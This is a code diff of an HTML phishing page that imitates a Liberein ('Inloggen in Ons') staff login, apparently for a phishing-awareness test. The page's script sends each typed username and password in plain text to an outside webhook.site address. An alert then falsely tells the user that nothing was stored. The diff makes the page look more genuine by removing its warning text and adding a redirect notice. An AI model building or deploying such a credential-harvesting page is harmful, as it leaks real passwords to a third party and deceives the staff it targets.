@@ -3,11 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Liberein | Inloggen</title>
+  <title>Liberein | Inloggen in Ons</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f9f7f0;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/1/1c/Van_Gogh_-_Starry_Night_-_Google_Art_Project.jpg');
+      background-size: cover;
+      background-position: center;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -15,54 +17,54 @@
       margin: 0;
     }
     .login-container {
-      background-color: #ffffff;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      padding: 30px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      max-width: 400px;
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 40px 30px;
       width: 100%;
+      max-width: 420px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
     }
     .logo {
-      display: flex;
-      justify-content: center;
+      text-align: center;
       margin-bottom: 20px;
     }
     .logo img {
-      height: 50px;
+      height: 40px;
     }
-    h2 {
+    .login-title {
+      font-size: 18px;
       text-align: center;
-      color: #4a754b;
-    }
-    label {
-      display: block;
-      margin-top: 15px;
       color: #333;
+      margin-bottom: 20px;
     }
-    input[type="text"], input[type="password"] {
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
-      border: 1px solid #aaa;
-      border-radius: 5px;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
     }
-    button {
+    .login-button {
       width: 100%;
-      margin-top: 25px;
-      padding: 10px;
-      background-color: #ef2b83;
-      border: none;
+      background-color: #d13c75;
       color: white;
-      font-weight: bold;
-      border-radius: 5px;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
+      margin-top: 15px;
     }
-    .footer-msg {
+    .login-button:hover {
+      background-color: #b12e63;
+    }
+    .footer-text {
       margin-top: 20px;
+      font-size: 0.85em;
+      color: #666;
       text-align: center;
-      color: #777;
-      font-size: 0.9em;
     }
   </style>
 </head>
@@ -71,18 +73,14 @@
     <div class="logo">
       <img src="https://www.liberein.nl/themes/custom/liberein/logo.svg" alt="Liberein logo">
     </div>
-    <h2>Beveiligde toegang</h2>
+    <div class="login-title">Inloggen in Ons</div>
     <form onsubmit="handleSubmit(event)">
-      <label for="username">Gebruikersnaam</label>
-      <input type="text" id="username" name="username" required>
-
-      <label for="password">Wachtwoord</label>
-      <input type="password" id="password" name="password" required>
-
-      <button type="submit">Inloggen</button>
+      <input type="text" id="username" name="username" placeholder="Gebruikersnaam" required>
+      <input type="password" id="password" name="password" placeholder="Wachtwoord" required>
+      <button type="submit" class="login-button">Aanmelden</button>
     </form>
-    <div class="footer-msg">
-      Alleen voor geautoriseerde medewerkers van Liberein
+    <div class="footer-text">
+      Je wordt doorgestuurd naar je vorige locatie. <a href="#" style="color:#666;">Dit wil ik niet.</a>
     </div>
   </div>
 
@@ -93,21 +91,20 @@
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
-      // Melding versturen via webhook.site (simulatie)
       fetch("https://webhook.site/639b037a-e040-4165-b6bb-83bc9dfa7844", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          actie: "Simulatie login",
+          actie: "Phishing simulatie",
           tijd: new Date().toISOString(),
           gebruiker: username,
           wachtwoord: password
         })
       });
 
-      alert("Let op: Dit was een simulatie van een phishingtest.\nEr zijn geen gegevens opgeslagen.\n\nBedankt voor je deelname!");
+      alert("⚠️ Dit was een gesimuleerde phishingtest.\nEr is niets opgeslagen.\nBedankt voor je alertheid!");
     }
   </script>
 </body>
